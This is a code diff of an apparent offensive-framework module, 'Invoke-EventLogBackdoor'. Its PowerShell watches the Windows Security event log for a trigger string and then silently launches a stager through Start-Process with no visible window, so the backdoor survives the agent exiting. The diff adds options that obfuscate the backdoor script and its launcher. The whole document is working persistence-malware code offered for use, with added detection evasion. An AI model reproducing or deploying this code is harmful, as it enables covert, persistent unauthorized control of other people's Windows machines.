@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://sixdub.net'
             ]
@@ -74,14 +74,14 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Invoke-EventLogBackdoor
 {
     Param(
-    [Parameter(Mandatory=$False,Position=1)]    
-    [string]$Trigger="HACKER", 
+    [Parameter(Mandatory=$False,Position=1)]
+    [string]$Trigger="HACKER",
     [Parameter(Mandatory=$False,Position=2)]
     [int]$Timeout=0,
     [Parameter(Mandatory=$False,Position=3)]
@@ -98,7 +98,7 @@ function Invoke-EventLogBackdoor
         }
         $d = Get-Date
         $NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String
-        
+
         if($NewEvents -match $Trigger)
         {
             REPLACE_LAUNCHER
@@ -133,7 +133,7 @@ Invoke-EventLogBackdoor"""
             else:
                 script = script.replace("REPLACE_LAUNCHER", stagerCode)
                 script = script.encode('ascii', 'ignore')
-        
+
         for option,values in self.options.iteritems():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                 if values['Value'] and values['Value'] != '':
@@ -141,8 +141,9 @@ Invoke-EventLogBackdoor"""
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
+                        script += " -" + str(option) + " " + str(values['Value'])
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         outFile = self.options['OutFile']['Value']
         if outFile != '':
             # make the base directory if it doesn't exist
@@ -157,14 +158,19 @@ Invoke-EventLogBackdoor"""
             return ""
 
         # transform the backdoor into something launched by powershell.exe
-        # so it survives the agent exiting  
-        launcher = helpers.powershell_launcher(script) 
+        # so it survives the agent exiting
+        launcher = helpers.powershell_launcher(script)
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        if obfuscate:
+            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
 
         print scriptLauncher
-        
+
         return scriptLauncher
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
